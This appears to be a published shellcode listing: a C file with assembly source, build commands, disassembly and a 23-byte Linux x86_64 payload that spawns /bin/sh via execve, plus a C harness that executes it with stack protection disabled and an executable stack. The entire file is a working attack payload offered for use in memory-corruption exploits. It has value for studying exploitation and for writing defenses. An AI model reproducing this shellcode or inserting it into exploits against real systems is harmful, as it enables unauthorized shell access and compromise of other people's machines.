/*
;Category: Shellcode
;Title: GNU/Linux x86_64 - execve /bin/sh
;Author: rajvardhan
;Date: 23/05/2019
;Architecture: Linux x86_64
;Possibly The Smallest And Fully Reliable Shellcode

===========
Asm Source
===========

global _start
section .text
_start:
	xor rsi,rsi
	push rsi
	mov rdi,0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	push 59
	pop rax
	cdq
	syscall
================================
Instruction for nasm compliation
================================

nasm -f elf64 shellcode.asm -o shellcode.o
ld shellcode.o -o shellcode

===================
objdump disassembly
===================

Disassembly of section .text:

0000000000401000 <_start>:
  401000:	48 31 f6             	xor    %rsi,%rsi
  401003:	56                   	push   %rsi
  401004:	48 bf 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rdi
  40100b:	2f 73 68
  40100e:	57                   	push   %rdi
  40100f:	54                   	push   %rsp
  401010:	5f                   	pop    %rdi
  401011:	6a 3b                	pushq  $0x3b
  401013:	58                   	pop    %rax
  401014:	99                   	cltd
  401015:	0f 05                	syscall

==================
23 Bytes Shellcode
==================

\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05

======================
C Compilation And Test
======================

gcc -fno-stack-protector -z execstack shellcode.c -o shellcode

*/

#include <stdio.h>

unsigned char shellcode[] = \
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
int main()
{
    int (*ret)() = (int(*)())shellcode;
    ret();
}